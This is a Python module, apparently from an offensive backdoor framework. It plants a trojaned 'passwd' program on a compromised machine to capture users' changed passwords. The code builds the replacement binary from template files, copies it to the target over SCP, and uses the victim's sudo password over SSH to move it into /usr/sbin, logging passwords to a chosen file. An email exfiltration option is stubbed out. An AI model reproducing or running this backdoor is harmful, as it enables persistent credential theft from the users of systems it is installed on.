from backdoors.backdoor import *

#courtesy of Cwenck (github.com/cwenck)

class Password(Backdoor):
	prompt = Fore.RED + "(bash2) " + Fore.BLUE + ">> " + Fore.RESET

	def __init__(self, core):
		cmd.Cmd.__init__(self)
		self.intro = GOOD + "Using password module"
		self.core = core
		self.options = {
			"file" : Option("file", "/passwords.txt", "file to write the passwords to", True),
			"email" : Option("email", "", "email to send the passwords", True), #not supported yet
		}
		self.allow_modules = False
		self.modules = {}
		self.help_text = INFO + "Save all changed passwords to a file"

	def do_exploit(self, args):
		fileLoc = str(self.get_value("file"))
		toW = "backdoors/auxiliary/password/passwd"
		stringToAdd = ""
		fileToWrite = open(toW, 'w')

		with open ("backdoors/auxiliary/password/pass1", "r") as myfile:
		    data=myfile.read()
		data = data[:-1]#remove the last new line character.
		stringToAdd+=data + fileLoc
		with open ("backdoors/auxiliary/password/pass2", "r") as myfile:
		    data=myfile.read()
		stringToAdd+=data
		fileToWrite.write(stringToAdd)
		fileToWrite.close()
		self.core.curtarget.scpFiles(self, 'backdoors/auxiliary/password/passwd', False)
		self.core.curtarget.ssh.exec_command("echo " + self.core.curtarget.pword + " | sudo -S mv ~/passwd /usr/sbin")